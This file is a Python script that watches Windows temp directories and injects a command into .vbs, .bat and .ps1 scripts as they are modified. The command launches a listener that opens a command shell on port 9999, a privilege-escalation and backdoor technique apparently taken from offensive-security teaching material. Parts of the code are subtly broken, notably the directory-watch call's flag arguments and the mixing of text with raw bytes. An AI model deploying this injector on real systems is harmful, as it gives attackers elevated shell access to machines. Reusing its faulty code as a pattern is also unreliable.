import tempfile
import threading
import win32file
import win32con
import os

# common temp file directories
dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

# file modification constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3 
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

# extension based code snippets to inject
file_types = {}
command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
file_types[".vbs"] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
file_types[".bat"] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
file_types[".ps1"] = ["\r\n#bhpmarker", "Start-Process \"%s\"" % command]

def inject_code(full_filename, extension, contents):
    # check if our marker is already in the file
    if file_types[extension][0] in contents:
        return
    
    # if not, let's inject marker and code
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents
    
    with open(full_filename, "wb") as fd:
        fd.write(full_contents.encode())
        
    print("[\o/] Injected code")
    
    return

def start_monitor(path_to_watch):
    # create a thread for each monitoring run
    file_list_directory = 0x0001
    
    h_directory = win32file.CreateFile(
        path_to_watch,
        file_list_directory,
        win32con.FILE_SHARE_READ
        | win32con.FILE_SHARE_WRITE
        | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)
    
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(h_directory, 1024, True,
                                                      win32con.FILE_NOTIFY_CHANGE_FILE_NAME,
                                                      win32con.FILE_NOTIFY_CHANGE_DIR_NAME,
                                                      win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES,
                                                      win32con.FILE_NOTIFY_CHANGE_SIZE,
                                                      win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
                                                      win32con.FILE_NOTIFY_CHANGE_SECURITY,
                                                      None, None)
            
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                
                if action == FILE_CREATED:
                    print(f"[+] Created {full_filename}")
                elif action == FILE_DELETED:
                    print(f"[-] Deleted {full_filename}")
                elif action == FILE_MODIFIED:
                    print(f"[*] Modified {full_filename}")

                    # dump the file contents
                    print("[vvv] Dumping contents...")
                    
                    try:
                        with open(full_filename, "rb") as fd:
                            contents = fd.read()
                        print(contents)
                        print("[^^^] Dump completed")
                        filename, extension = os.path.splitext(full_filename)
                        if extension in file_types:
                            inject_code(full_filename, extension, contents)
                    except Exception as e:
                        print(f"[!!!] Failed! Error: {e}")
                        
                elif action == FILE_RENAMED_FROM:
                    print(f"[ > ] Renamed from {full_filename}")
                elif action == FILE_RENAMED_TO:
                    print(f"[ < ] Renamed to: {full_filename}")
                else:
                    print(f"[???] Unknown: {full_filename}")
        
        except:
            pass  
        
for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor, args=(path,))
    print(f"Spawing monitoring thread for path: {path}")
    monitor_thread.start()
    